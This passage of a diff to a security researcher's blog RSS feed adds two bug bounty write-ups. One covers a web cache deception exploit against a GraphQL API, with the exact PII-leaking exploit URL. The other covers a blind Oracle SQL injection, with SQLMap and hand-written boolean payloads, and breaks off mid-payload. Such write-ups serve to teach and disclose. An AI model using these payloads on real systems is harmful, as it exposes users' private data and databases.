@@ -5,8 +5,387 @@
     <link>https://kuldeep.io/</link>
     <description>Recent content on kuldeepdotexe&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Thu, 20 Jul 2023 20:58:53 +0530</lastBuildDate><atom:link href="https://kuldeep.io/index.xml" rel="self" type="application/rss+xml" />
+    <language>en</language>
+    <lastBuildDate>Fri, 29 Dec 2023 14:55:26 +0530</lastBuildDate><atom:link href="https://kuldeep.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Cache Deception Without Path Confusion</title>
+      <link>https://kuldeep.io/posts/web-cache-deception-without-path-confusion/</link>
+      <pubDate>Fri, 29 Dec 2023 14:55:26 +0530</pubDate>
+      
+      <guid>https://kuldeep.io/posts/web-cache-deception-without-path-confusion/</guid>
+      <description>Hello readers,
+Today, we’ll talk about a unique case of a cache deception vulnerability that I found in one of the Synack Red Team targets. I call this particular case of cache deception vulnerability unique because unlike the usual cache deception exploits, this exploit did not rely on path confusion.
+Unlike my other blogs, I have decided to explain some of the basics in this one because the little details are fascinating!</description>
+      <content>&lt;p&gt;Hello readers,&lt;/p&gt;
+&lt;p&gt;Today, we’ll talk about a unique case of a cache deception vulnerability that I found in one of the Synack Red Team targets. I call this particular case of cache deception vulnerability unique because unlike the usual cache deception exploits, this exploit did not rely on path confusion.&lt;/p&gt;
+&lt;p&gt;Unlike my other blogs, I have decided to explain some of the basics in this one because the little details are fascinating!&lt;/p&gt;
+&lt;p&gt;Let’s break down the blog into smaller chunks so that we can take one bite at a time.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#the-basics&#34;&gt;The Basics&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#path-confusion&#34;&gt;Path Confusion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#web-caching&#34;&gt;Web Caching&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#cache-keys&#34;&gt;Cache Keys&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#web-cache-deception&#34;&gt;Web Cache Deception&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#discovery&#34;&gt;Discovery&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#exploit&#34;&gt;Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#limitations&#34;&gt;Limitations&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#wcd-on-a-synack-target&#34;&gt;WCD On A Synack Target&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#initial-observations&#34;&gt;Initial Observations&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kuldeep.io/posts/web-cache-deception-without-path-confusion/#crafting-the-exploit&#34;&gt;Crafting The Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;the-basics&#34;&gt;The Basics&lt;/h1&gt;
+&lt;p&gt;Before going to the specifics of the vulnerability, I would like to elaborate more on the terminologies and techniques that we will use in this blog.&lt;/p&gt;
+&lt;h2 id=&#34;path-confusion&#34;&gt;Path Confusion&lt;/h2&gt;
+&lt;p&gt;Path confusions occur when the application is not configured properly to distinguish between different paths. In a nutshell— it is when two different paths are interpreted as the same path by the application. Similar to what happens in a hash collision.&lt;/p&gt;
+&lt;p&gt;Let’s take an example. Suppose you request the following URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://kuldeep.io/account/billing
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Everything is okay and you go to the billing page of your account. Now, you visit a second URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://kuldeep.io/account/billing/nonexistent.js
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In an ideal scenario, visiting this URL should result in a &lt;code&gt;404 Not Found&lt;/code&gt; because the JS file that we requested does not exist on the web server.&lt;/p&gt;
+&lt;p&gt;However, due to a misconfiguration in how the application processes paths/routes, the application takes you to the billing page of your account.&lt;/p&gt;
+&lt;p&gt;This is path confusion— two different paths interpreted as the same.&lt;/p&gt;
+&lt;p&gt;So many talks on a topic that I did not even use in my final exploit.&lt;/p&gt;
+&lt;h2 id=&#34;web-caching&#34;&gt;Web Caching&lt;/h2&gt;
+&lt;p&gt;Processing webpages is a resource-intensive task. When you send a request to, for example, a server running PHP, the server runs the PHP code and provides you with the response.&lt;/p&gt;
+&lt;p&gt;This is useful in cases when you are working with dynamic data like user profile information or financial information. However, you do not want the server to process requests to the homepage, or a header/footer, or a static file because as we discussed earlier, it is a resource-intensive task.&lt;/p&gt;
+&lt;p&gt;Static files might not take that many resources as compared to the application code but the server still needs to process those requests one-by-one.&lt;/p&gt;
+&lt;p&gt;This problem can be solved using &lt;strong&gt;web caching&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Web caching is when a front-end server caches the response and serves it to the visitors of the website without relying on the back-end server. This can be explained with the following illustration:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/web-caching.png&#34; alt=&#34;web caching.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When a response is served from the cache, you will likely see the following response headers indicating this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Cache: HIT
+X-CDN-Cache: HIT
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A &lt;strong&gt;HIT&lt;/strong&gt; means that the response is served from the cache. When it is the otherwise, you will see a &lt;strong&gt;MISS&lt;/strong&gt; instead of &lt;strong&gt;HIT&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Please note that the response header names are likely to vary.&lt;/p&gt;
+&lt;p&gt;How does the front-end server know when to cache the request? It makes use of &lt;strong&gt;cache keys&lt;/strong&gt;!&lt;/p&gt;
+&lt;h2 id=&#34;cache-keys&#34;&gt;Cache Keys&lt;/h2&gt;
+&lt;p&gt;Cache keys are a number of factors that determine whether or not the request will be cached. Usually, cache keys comprise the URL, the user agent, and the user region. Cache keys can be customized to cache based on specific conditions.&lt;/p&gt;
+&lt;p&gt;Different front-end servers have different mechanisms for configuring cache keys. Nevertheless, the basic concept stays the same.&lt;/p&gt;
+&lt;h2 id=&#34;web-cache-deception&#34;&gt;Web Cache Deception&lt;/h2&gt;
+&lt;p&gt;In the &lt;strong&gt;Web Caching&lt;/strong&gt; section, we saw that the front-end server can be configured to cache specific responses. This raises a question— &lt;em&gt;what if we cache responses that should not be cached?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Usually, only the static resources are cached. But if we could somehow cache the responses that contain sensitive data like cookies or session identifiers or JSON Web Tokens or PII, it would be awesome or scary depending on what side you are on.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Web Cache Deception&lt;/strong&gt; attacks occur when an attacker forces the front-end server to cache sensitive data and then retrieve it from the cache.&lt;/p&gt;
+&lt;h3 id=&#34;discovery&#34;&gt;Discovery&lt;/h3&gt;
+&lt;p&gt;The very first step towards discovering a WCD vulnerability is to log in to the target application as a normal user and make notes of interesting endpoints.&lt;/p&gt;
+&lt;p&gt;What makes an endpoint interesting? Well, it highly depends on the nature of the application. For example, if it is a betting application, maybe knowing how many bets you have made might be interesting. If it is a banking application, most of the endpoints might be interesting because you do not want anyone to know your bank details. All-in-all, we can all agree that all endpoints that disclose PII are sensitive.&lt;/p&gt;
+&lt;p&gt;While doing this, make sure that the endpoints that you come across are using &lt;strong&gt;cookies&lt;/strong&gt; as the authentication mechanism instead of bearer tokens. Why is this important will be covered in the exploitation section.&lt;/p&gt;
+&lt;p&gt;Once you have a vast list of interesting endpoints, you can check for path confusion misconfigurations. While doing this, check the response for cache-related headers to see if you see any cache &lt;strong&gt;HIT&lt;/strong&gt;s.&lt;/p&gt;
+&lt;p&gt;For this, I would suggest reading this awesome write-up by &lt;a href=&#34;https://twitter.com/bxmbn&#34;&gt;Bombon&lt;/a&gt;: &lt;a href=&#34;https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9&#34;&gt;https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;If you see any cache HITs in the interesting endpoints, it can likely be exploited.&lt;/p&gt;
+&lt;p&gt;Why do we see cache HITs? Because front-end servers might be configured to cache JS files, CSS files, images, etc. And because we are using path confusion, the front-end server will treat it as a JS file or a CSS depending on what extension you chose. However, the backend server will treat it as a normal request because routing is misconfigured.&lt;/p&gt;
+&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
+&lt;p&gt;Once you have found that an interesting endpoint is resulting in a cache HIT, it is time to craft the exploit.&lt;/p&gt;
+&lt;p&gt;Let’s assume that we have found that &lt;code&gt;[https://kuldeep.io/account/billing/nonexistent.js](https://kuldeep.io/account/billing/nonexistent.js)&lt;/code&gt; results in a cache HIT. We have also confirmed that the web application is using cookies as the authentication mechanism. Let’s convert this to an exploit.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Send this URL to the victim: &lt;a href=&#34;https://kuldeep.io/account/billing/nonexistent.js&#34;&gt;https://kuldeep.io/account/billing/nonexistent.js&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Once the victim visits the URL from his/her authenticated session, the backend server will respond with the billing information. The front-end server will cache the response because it believes that the response is coming from a JS file and JS files should be cached.&lt;/li&gt;
+&lt;li&gt;The attacker will retrieve the billing information by visiting the &lt;a href=&#34;https://kuldeep.io/account/billing/nonexistent.js&#34;&gt;https://kuldeep.io/account/billing/nonexistent.js&lt;/a&gt; URL. Because the response has been cached, the attacker will receive a cached copy from the front-end server. This cached copy includes all the billing information of the victim.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Here, if the application used bearer tokens, we cannot exploit this by simply sending the URL to the victim. It would require an XSS to exploit. And if you already have an XSS, there is no point exploiting WCD.&lt;/p&gt;
+&lt;h3 id=&#34;limitations&#34;&gt;Limitations&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;WCD will not work if the user isn’t logged in.&lt;/li&gt;
+&lt;li&gt;It will not work if the application is using bearer tokens as the authentication mechanism.&lt;/li&gt;
+&lt;li&gt;In some configurations, the cache will only be served if you are in the same region as the victim.&lt;/li&gt;
+&lt;li&gt;If you accidentally visit the URL that you sent to the victim, the victim will receive the cached copy instead of you.&lt;/li&gt;
+&lt;li&gt;Even if you get the victim to cache his/her response, the cache may get invalidated after a few seconds or minutes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now that we have covered the basics, let’s move to the WCD vulnerability that I found in one of the Synack targets.&lt;/p&gt;
+&lt;h1 id=&#34;wcd-on-a-synack-target&#34;&gt;WCD On A Synack Target&lt;/h1&gt;
+&lt;h2 id=&#34;initial-observations&#34;&gt;Initial Observations&lt;/h2&gt;
+&lt;p&gt;I was onboarded to a target where some SRTs had already submitted some vulnerabilities like information disclosures and a few access controls.&lt;/p&gt;
+&lt;p&gt;I connected to the target and started traversing the application like a normal user. Wherever possible, I was checking for SQL injections. While doing this, I noticed the static files were served from a GraphQL API. This was unusual.&lt;/p&gt;
+&lt;p&gt;I checked what API the application used for dynamic data. To my surprise, it used the same GraphQL API for both, static and dynamic data.&lt;/p&gt;
+&lt;p&gt;To retrieve static content, the application used a URL like this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/ui-gateway/v1/graphql?query=query{somequery{someattribute}}&amp;amp;reqIdentifier=someReqIdentifier
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the response header, I noticed that the responses were being cached. I came to this conclusion by seeing the following headers:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Served-By: cache-iad-somethingrandom-IAD
+X-Cache: HIT
+X-Cache-Hits: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To retrieve dynamic content, the application sent a &lt;strong&gt;POST&lt;/strong&gt; request to the GraphQL API. Unlike the GET requests, the POST requests did not get cached.&lt;/p&gt;
+&lt;p&gt;I thought about converting the POST requests to GET requests to see if they got cached. For this, I used an &lt;strong&gt;interesting&lt;/strong&gt; query that is as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;userDetails&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    authStatus {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      authType
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      email
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      firstName
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      lastName
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      roles
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      userId
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      userLogin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      birthDate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      isUnderAgeUser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    geoLocation
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This query returns the PII of the currently logged-in user.&lt;/p&gt;
+&lt;p&gt;I converted it to a GET request. The final URL looked like this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/ui-gateway/v1/graphql?query=query{userDetails{authStatus{authType email firstName lastName roles userId userLogin birthDate isUnderAgeUser}geoLocation}}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Excited to see the results, I visited the URL from the browser and checked if the response was cached. Sadly, it was not cached. I could not see any cache HITs.&lt;/p&gt;
+&lt;p&gt;This made me wonder, &lt;em&gt;how are requests to static queries being cached while dynamic queries aren’t&lt;/em&gt;. I sent both of the requests to Burp Suite comparer to see if any special headers determined if the request was cached.&lt;/p&gt;
+&lt;p&gt;While doing this, I found a crucial parameter that I had overlooked. The &lt;code&gt;reqIdentifier&lt;/code&gt; parameter.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;reqIdentifier&lt;/code&gt; parameter determined if the request would be cached or not. It was in the cache key. If two requests have the same &lt;code&gt;reqIdentifier&lt;/code&gt; parameter, they would be treated as the same requests by the front-end server.&lt;/p&gt;
+&lt;h2 id=&#34;crafting-the-exploit&#34;&gt;Crafting The Exploit&lt;/h2&gt;
+&lt;p&gt;Now that I had a way to get sensitive information cached, I just had to craft an exploit. A malicious URL that I would send to the victim to get his/her PII cached.&lt;/p&gt;
+&lt;p&gt;I used the previous &lt;code&gt;userDetails&lt;/code&gt; query that I had used in a GET request and appended the &lt;code&gt;reqIdentifier&lt;/code&gt; parameter. Sending this parameter made sure that the request will be cached.&lt;/p&gt;
+&lt;p&gt;The final exploit URL looked like this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/ui-gateway/v1/graphql?query=query{userDetails{authStatus{authType email firstName lastName roles userId userLogin birthDate isUnderAgeUser}geoLocation}}&amp;amp;reqIdentifier=exploitMe
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For a proof-of-concept, I opened two browser windows. One was with a logged-in session (victim session), and the other was an incognito window (attacker session).&lt;/p&gt;
+&lt;p&gt;I opened the exploit URL from the logged-in session. This made sure that the PII was cached by the front-end server. By visiting the URL just once, the front-end server cached the response.&lt;/p&gt;
+&lt;p&gt;I then opened the same URL from the incognito window and I was greeted with the victim account’s PII. This way, without any sort of authentication, I was able to access a victim account’s confidential details.&lt;/p&gt;
+&lt;p&gt;I created an easy-to-follow PoC for this exploit and sent it to Synack. And they happily accepted the vulnerability.&lt;/p&gt;
+&lt;p&gt;Thank you for reading. If you have any queries or doubts, feel free to ping me on &lt;a href=&#34;https://twitter.com/kuldeepdotexe&#34;&gt;X&lt;/a&gt;, &lt;a href=&#34;http://instagram.com/kuldeepdotexe&#34;&gt;Instagram&lt;/a&gt;, or &lt;a href=&#34;https://www.linkedin.com/in/kuldeep-pandya-13a26a167/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;references-and-further-reading&#34;&gt;References And Further Reading&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://portswigger.net/daily-swig/path-confusion-web-cache-deception-threatens-user-information-online&#34;&gt;https://portswigger.net/daily-swig/path-confusion-web-cache-deception-threatens-user-information-online&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://portswigger.net/research/practical-web-cache-poisoning&#34;&gt;https://portswigger.net/research/practical-web-cache-poisoning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bxmbn.medium.com/chaining-cache-deception-poisoning-250ec69774c8&#34;&gt;https://bxmbn.medium.com/chaining-cache-deception-poisoning-250ec69774c8&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/&#34;&gt;https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.varnish-software.com/glossary/what-is-web-caching/&#34;&gt;https://www.varnish-software.com/glossary/what-is-web-caching/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Happy Hacking! :)&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Defeating Length Filters to Dump the Database - SQLi</title>
+      <link>https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/</link>
+      <pubDate>Wed, 06 Dec 2023 20:39:44 +0530</pubDate>
+      
+      <guid>https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/</guid>
+      <description>Hello, hackers!
+As usual, this blog post will focus on my recent findings. This time, it was an SQL injection. Most SQL injections I find are very trivial and do not require a separate blog post.
+However, this particular SQL injection was far from being straightforward. It required me to work 13+ hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.</description>
+      <content>&lt;p&gt;Hello, hackers!&lt;/p&gt;
+&lt;p&gt;As usual, this blog post will focus on my recent findings. This time, it was an SQL injection. Most SQL injections I find are very trivial and do not require a separate blog post.&lt;/p&gt;
+&lt;p&gt;However, this particular SQL injection was far from being straightforward. It required me to work 13+ hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.&lt;/p&gt;
+&lt;p&gt;This blog post aims to share with the community the tricks that I learned. I hope that these tricks will be helpful to someone who encounters similar challenges.&lt;/p&gt;
+&lt;p&gt;In this blog post, I will cover my entire thought process and journey from detection to full exploitation of the SQL injection.&lt;/p&gt;
+&lt;p&gt;For your convenience, I will break apart this blog into several sections. These sections will be as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Discovery&lt;/li&gt;
+&lt;li&gt;Running SQLMap And Discovering The Balanced Query&lt;/li&gt;
+&lt;li&gt;SQLMap Failing To Dump The Database&lt;/li&gt;
+&lt;li&gt;Discovering Length Filter&lt;/li&gt;
+&lt;li&gt;Dumping The Database Name&lt;/li&gt;
+&lt;li&gt;Dumping The Table Name&lt;/li&gt;
+&lt;li&gt;Finding A Way To Use Limits And Offsets&lt;/li&gt;
+&lt;li&gt;Finding The Shortest Possible Payload&lt;/li&gt;
+&lt;li&gt;Successfully Dumping Table Names&lt;/li&gt;
+&lt;li&gt;Guessing Column Names&lt;/li&gt;
+&lt;li&gt;Dumping The Rows&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These look like a lot of sections. This is because they are! I am trying to crunch up 13+ hours of work into a single blog. Brace yourself for a long read.&lt;/p&gt;
+&lt;h3 id=&#34;discovery&#34;&gt;Discovery&lt;/h3&gt;
+&lt;p&gt;A new target was onboarded to me on the Synack Red Team platform. However, it was an old target launched under a new name. No surprise there.&lt;/p&gt;
+&lt;p&gt;While this target was previously onboarded, I sent a few SQLis. Because of this, I was certain that I could find more SQLis this time.&lt;/p&gt;
+&lt;p&gt;As usual, I browsed the application like a normal user and checked the requests that the application sent. I tested each request manually for SQL injections.&lt;/p&gt;
+&lt;p&gt;The &amp;ldquo;manual testing&amp;rdquo; part for me is mostly injecting special characters into different parameters and observing the behavior of the application.&lt;/p&gt;
+&lt;p&gt;While testing for SQL injection on a particular request, I noticed the following behavior:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Payload&lt;/th&gt;
+&lt;th&gt;Response Length&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;422k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;33k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;-- -&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;33k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&#39;)-- -&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;422k Bytes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Note: The first value is nothing. I sent nothing. It is the normal response the application would send.&lt;/p&gt;
+&lt;p&gt;This was intriguing behavior. It looked like a potential SQL injection. I tried a few more SQLi payloads but I could not find the right payload for it.&lt;/p&gt;
+&lt;h3 id=&#34;running-sqlmap-and-discovering-the-balanced-query&#34;&gt;Running SQLMap And Discovering The Balanced Query&lt;/h3&gt;
+&lt;p&gt;To find the correct query, I sent the request to &lt;a href=&#34;https://github.com/sqlmapproject/sqlmap&#34;&gt;SQLMap&lt;/a&gt;. SQLMap successfully discovered the SQL injection and gave me the query that would give me a boolean response.&lt;/p&gt;
+&lt;p&gt;It gave me the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT (CASE WHEN (4747=4747) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4747) END) FROM DUAL) IS NULL OR &amp;#39;&lt;/span&gt;iTjZ&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;tEus
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;payload-explanation&#34;&gt;Payload Explanation&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;SELECT (...) FROM DUAL&lt;/code&gt;: This is just a simple &lt;code&gt;SELECT&lt;/code&gt; query that encapsulates the underlying &lt;code&gt;CASE...WHEN&lt;/code&gt; statement.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CASE WHEN (condition) THEN &amp;lt;true statement&amp;gt; ELSE &amp;lt;false statement&amp;gt; END&lt;/code&gt;: This section is the most important as &lt;code&gt;CASE...WHEN&lt;/code&gt; will execute a &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; statement based on the condition. It is similar to the classic &lt;code&gt;if…else&lt;/code&gt; in different programming languages.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;4747=4747&lt;/code&gt;: This is an always true condition as 4747 is always equal to 4747.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CTXSYS.DRITHSX.SN(1,4747)&lt;/code&gt;: This is a function call to an internal Oracle DBMS function. I could not find much documentation about the function. But in this payload, this function should respond with an error message.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;So, the payload checks if 4747 is equal to 4747 (which is true) then it selects &lt;code&gt;NULL&lt;/code&gt; and compares &lt;code&gt;NULL&lt;/code&gt; with &lt;code&gt;NULL&lt;/code&gt; (which is also true). This will result in a true response.&lt;/p&gt;
+&lt;p&gt;If we wanted to receive a false response, we would replace &lt;code&gt;4747=4747&lt;/code&gt; with &lt;code&gt;4747=4848&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I now had a working payload. I tried to enumerate the databases using SQLMap. However, SQLMap failed to enumerate the databases.&lt;/p&gt;
+&lt;p&gt;I was not surprised by this behavior because, during my initial enumeration, I noticed that the server correctly filtered out some characters. These characters included but were not limited to the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;`&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Due to these character filters, SQLMap was unable to enumerate the databases. I decided to do the database dumping by hand.&lt;/p&gt;
+&lt;p&gt;I simplified the SQLMap&amp;rsquo;s payload to the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	CASE 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	WHEN (1=1) THEN NULL 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ) FROM DUAL
